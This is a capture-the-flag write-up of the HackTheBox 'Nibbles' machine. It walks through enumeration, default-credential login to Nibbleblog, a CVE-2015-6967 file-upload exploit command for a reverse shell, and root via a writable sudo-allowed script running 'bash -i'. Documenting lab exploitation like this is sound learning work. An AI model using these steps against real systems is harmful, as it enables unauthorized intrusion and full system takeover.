---
title: Nibbles
tags:
  - HackTheBox
  - Easy
  - Linux
  - Web
  - Sudo-Vulnerability
---
![](Pasted%20image%2020241104161017.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.10.75 nibbles.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- nibbles.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).
```

So I decided to take a look at the webpage:

![](Pasted%20image%2020241104161240.png)

Inspecting the source code I notice the hidden directory `nibbleblog`:

![](Pasted%20image%2020241104161349.png)

![](Pasted%20image%2020241104161421.png)

So I decided to perform some enumeration using [dirsearch 📁](/notes/tools/dirsearch.md):

```shell
dirsearch -e php -u http://nibbles.htb/nibbleblog/

[redacted]
[16:17:19] 301 -  321B  - /nibbleblog/admin  ->  http://nibbles.htb/nibbleblog/admin/
[16:17:19] 200 -  606B  - /nibbleblog/admin.php                             
[16:17:19] 200 -  516B  - /nibbleblog/admin/                                
[16:17:19] 301 -  332B  - /nibbleblog/admin/js/tinymce  ->  http://nibbles.htb/nibbleblog/admin/js/tinymce/
[16:17:19] 200 -  563B  - /nibbleblog/admin/js/tinymce/
[16:17:24] 301 -  323B  - /nibbleblog/content  ->  http://nibbles.htb/nibbleblog/content/
[16:17:24] 200 -  485B  - /nibbleblog/content/                              
[16:17:25] 200 -  724B  - /nibbleblog/COPYRIGHT.txt                         
[16:17:29] 200 -   92B  - /nibbleblog/install.php                           
[16:17:29] 200 -   92B  - /nibbleblog/install.php?profile=default           
[16:17:30] 301 -  325B  - /nibbleblog/languages  ->  http://nibbles.htb/nibbleblog/languages/
[16:17:30] 200 -   12KB - /nibbleblog/LICENSE.txt                           
[16:17:34] 200 -  694B  - /nibbleblog/plugins/                              
[16:17:34] 301 -  323B  - /nibbleblog/plugins  ->  http://nibbles.htb/nibbleblog/plugins/
[16:17:35] 200 -    5KB - /nibbleblog/README                                
[16:17:39] 301 -  322B  - /nibbleblog/themes  ->  http://nibbles.htb/nibbleblog/themes/
[16:17:39] 200 -  498B  - /nibbleblog/themes/                               
[16:17:40] 200 -  815B  - /nibbleblog/update.php
```

So I checked the `admin.php` file:

![](Pasted%20image%2020241104162503.png)

After some typical combination, none got me inside, so I decided to check the other findings. The one who got me up was `update.php`:

![](Pasted%20image%2020241104162615.png)

*So can I read private files?* That gave me an idea: I could inspect the `http://nibbles.htb/nibbleblog/content/private/` directory and maybe find some creds:

![](Pasted%20image%2020241104162734.png)

The one which was more interesting was `users.xml`:

![](Pasted%20image%2020241104163003.png)

Now we know that there is a user called `admin`

## Exploitation

Then i decided to search for "*nibbleblog cve*" and found [CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967). BTW it seems that common creds to use are `admin:nibbles`. I tried them and worked:

![](Pasted%20image%2020241104163159.png)

So I cloned the repo and executed the exploit to get a reverse shell:

```shell
python3 exploit.py --url http://nibbles.htb/nibbleblog/ --username admin --password nibbles --payload ../../shell.php
```

![](Pasted%20image%2020241104163547.png)

Now I can read the user flag:

![](Pasted%20image%2020241104164111.png)

## Privilege Escalation

If we run:

```shell
sudo -l

[redacted]
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

So we can create that file with the following content:

```shell
bash -i
# Then
sudo /home/nibbler/personal/stuff/monitor.sh
```

Now we're root and can read root flag:

![](Pasted%20image%2020241104164949.png)

==Machine pwned!==



